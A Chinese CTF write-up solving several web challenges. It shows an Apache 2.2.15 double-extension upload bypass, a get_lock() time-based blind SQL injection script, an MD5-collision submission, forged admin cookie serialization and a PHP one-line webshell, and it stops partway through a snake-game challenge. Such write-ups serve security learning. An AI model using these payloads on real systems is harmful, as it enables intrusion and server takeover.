
最后发现是考点是`apache2.2.15`的解析漏洞，跟代码怎么写没有关系。。。

在`apache2.2.15`版本的情况下，`test.php.png`及`.jpg`、`.gif`等均会被解析成php文件来执行，高版本的apache服务器不存在此漏洞。

尝试上传压缩包中名字为`test.php.png`的一句话木马时无法上传成功，判断可能黑名单检测php，这里我们上传文件名`test.PHP.png`为的一句话木马。

![1569592989615](upload/attach/202004/873556_BWPQ5QS77E5JZJG.jpg)

上传成功，得到flag

![1569593070099](upload/attach/202004/873556_AU9YQHNXMEF9HU5.jpg)

### sleepcms

> 要学习新的内容才能做出来 <mark class="encrypted">8f5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6M7`.</mark>

访问<mark class="encrypted">756K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6N6Q4x3V1k6J5L8$3u0G2N6s2y4Q4x3X3g2@1P5s2c8Q4y4U0l9`.</mark>

```sql
INSERT INTO `article` (`id`, `title`, `view_times`,`content`) VALUES
(1, 'admin\' flag',0, 'xxxxxxxxxxxxxxxxxxxxxxx'),
(2, 'hello guest',0, 'hello guest,you want is not here~~'),
(3, 'some hint',0, 'long or short?\r\nsleep and injection!');
```

从题目名称和`robots.txt`文件可以猜测，该题目考察的是基于时间的盲注

发现此处存在黑名单

![1569590980040](upload/attach/202004/873556_YJ2FQT6D67DGD99.jpg)

经过测试发现其检测`sleep`、`benchmark`函数，这里我们可以利用等价函数`get_lock()`来进行延时注入

参考资料<mark class="encrypted">9afK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0k6i4y4S2k6X3g2Q4x3X3g2U0L8$3#2Q4x3V1j5K6z5e0V1K6i4K6u0W2K9s2c8E0L8q4)9$3x3l9`.`.</mark>

可以注入出数据库名

![1569591287954](upload/attach/202004/873556_XKZA4PXDR8W9MZ3.jpg)

但是向下不得不使用`select`语句进行注入，这道题同样检测`select`

此时可以不使用传统的`数据库名=>表名=>字段名=>数据`的方式来进行注入，可以利用mysql 同库不需要`select`查表，直接可以查询字段名的特性来进行构造sql注入语句

```
id=1' and if(ascii(substr((content),1,1))>1,get_lock('test',3),1)%23
```

此时要注意使用`get_lock`函数时需要开两个session测试，第二次测试才会有正常的延时。

根据语句写出盲注脚本

```python
#coding=utf8
import requests
import time
data = ''
url = "http://114.55.36.69:8007/article.php?id=1'"
for i in range(47):
    for c in range(32,127):
        url_req = url + " and if(ascii(substr((content),{0},1))={1},get_lock('test',3),1)%23".format(i+1,str(c))
        print(url_req)
        start_time = time.time()
        res = requests.get(url_req)
        end_time = time.time()
        if (end_time - start_time) > 2.5:
            data += chr(c)
            print(data)
            break
print('data:',data)
```

运行得到flag

![1569593101648](upload/attach/202004/873556_6T75KDKBRJX4NVM.jpg)

### md5

> md5 crash <mark class="encrypted">423K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6j5`.</mark>

右击查看源代码

```
MD5 cracking<!-- if((string)$_POST['data1']!==(string)$_POST['data2']&&md5($_POST['data1'])===md5($_POST['data2']))-->fail
```

发现进行了类型转换，并且使强类型比较，可以使用md5碰撞生成器，生成两个内容不同，但是md5相同的问题件，来进行攻击

使用`fastcoll`工具来进行md5碰撞攻击

```
fastcoll_v1.0.0.5.exe -p .\a.bin -o a1.bin a2.bin
```

用python来进行读取然后进行url编码

```python
#coding=utf-8
import urllib.parse
import requests
f1 = open("a1.bin","rb").read()
f2 = open("a2.bin","rb").read()
data = {
'data1':f1,
'data2':f2,
}
flag = requests.post("http://114.55.36.69:8006",data=data).text
print(flag)
```

![1569590806621](upload/attach/202004/873556_RPRS7U95HQA4R2S.jpg)

### 简单的md5

> 简单的md5 <mark class="encrypted">f82K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6b7`.</mark>

访问后右击查看源代码

```
easy MD5 cracking <!--$_POST['data1']!=$_POST['data2']-->fail
```

直接传参

![1569589959820](upload/attach/202004/873556_TFCS68RCT76DMSU.jpg)

### 秘密的系统

> 不久前才开发的系统，功能也还不完善，代码也还有待改进 <mark class="encrypted">a99K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0c8Q4x3V1j5`.</mark>

访问<mark class="encrypted">9b6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0c8Q4x3V1k6%4k6h3u0Q4x3V1k6J5L8$3u0G2N6s2y4Q4x3X3g2@1P5s2c8Q4y4U0m8Q4c8e0g2Q4z5p5k6Q4z5e0q4Q4c8e0N6Q4z5p5g2Q4b7U0l9`.</mark>

```
User-agent: *
Disallow: index.php?r=site/loginuser_1
```

访问<mark class="encrypted">4f4K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0c8Q4x3V1k6%4k6h3u0Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9K6c8Y4u0Q4x3@1c8K6K9i4c8W2i4K6u0r3L8r3!0Y4K9h3&6#2M7$3g2J5i4K6g2X3x3g2)9$3x3q4!0q4y4g2)9^5c8W2!0n7x3#2!0q4y4g2)9^5y4#2!0n7b7W2!0q4y4W2)9&6c8W2!0m8y4g2!0q4y4#2)9&6b7#2)9^5b7W2!0q4y4W2!0n7b7g2)9&6x3q4!0q4y4q4!0n7b7W2!0m8x3#2!0q4y4#2!0m8x3q4)9^5x3b7`.`.</mark>

```
<!--
*** author: cib_zhinianyuxin.com
*** code: github.com
-->
```

给出了github的地址，通过它找到了作者留在github上的hint

```
It's just a system which is not completed , there are some tips:
you can use test/cib_sec to login ,but you are not admin!
only admin can upload file ,but whichone can not bypass my rules.
/**
$sign = array(
'id'=>$model->id,
'name'=>$model->username,
'sign'=>md5($model->id.$model->username),
);
$_COOKIE['Cib_security'] = serialize($sign);
*/
```

获得了一个测试账号`test/cib_sec`和cookie生成的php代码

```php
$sign = array(
'id'=>$model->id,
'name'=>$model->username,
'sign'=>md5($model->id.$model->username),
);
$_COOKIE['Cib_security'] = serialize($sign);
```

我们用测试账号登陆

发现权限是游客，`upload`功能无法使用

![1569586043107](upload/attach/202004/873556_2J8DQ4DABBURY2P.jpg)

我们来分析`test`用户的cookie，对其进行`urldecode`和反序列化操作

```php
Array{
[id]=>2
[name]=>test
[sign]=>7cbab5cea99169139e7e6d8ff74ebb77
}
```

根据github上的生成信息来伪造管理员的cookie

```php
<?php
$signAdmin = array(
"id"=>1,
"name"=>'admin',
"sign"=>'6c5de1b510e8bdd0bc40eff99dcd03f8'
);
$cib_sec = urlencode(serialize($signAdmin));
echo $cib_sec;
?>
```

获得cookie

```
a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%226c5de1b510e8bdd0bc40eff99dcd03f8%22%3B%7D
```

通过burpsuite替换cookie访问`upload`页面

![1569586575730](Writeup.assets/1569586575730.png)

成功访问`upload`页面

![1569586616551](upload/attach/202004/873556_M6NASW4453D76ZG.jpg)

我们利用上传点来上传我们的webshell

```php
<?php system($_POST['cmd']); ?>
```

上传点存在白名单验证，从返回包可以得知其是`apache2.2.15`，`apache2.2.15`版本具有文件解析漏洞，可以把`test.php.png`当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用`apache2.2.15`的解析漏洞来绕过白名单限制。

![1569586798936](upload/attach/202004/873556_FJHW49BSVV8RSC7.jpg)

成功上传，访问得到flag

![1569586832636](upload/attach/202004/873556_K2BV934ZAEHUW93.jpg)

### game

> 玩个蛇皮 <mark class="encrypted">bd7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0p5`.</mark>

这个题是一个用js实现的贪吃蛇游戏

![1569586981298](upload/attach/202004/873556_U4NPDPXR4P9M4F5.jpg)

玩一局就可以看到它的长度显示了出来，右击查看源代码

```html
<!DOCTYPE html>
<html>
<head>
<title>Game</title>
<link rel="stylesheet" type="text/css" href="./css/game.css" />
</head>
<body>
<div id="game-area" tabindex="0">
</div>
<script type="text/javascript" src="./js/game.js"></script>
<script type="text/javascript">
var mySnakeBoard = new SNAKE.Board( {
boardContainer: "game-area",
fullScreen: true
});
</script>
</body>
</html>
```

可以看到这里加载了`game.js`文件，我们访问<mark class="encrypted">15fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0q4Q4x3V1k6B7M7#2)9J5c8X3N6S2L8h3g2Q4x3X3g2B7M7#2)9$3x3l9`.`.</mark>
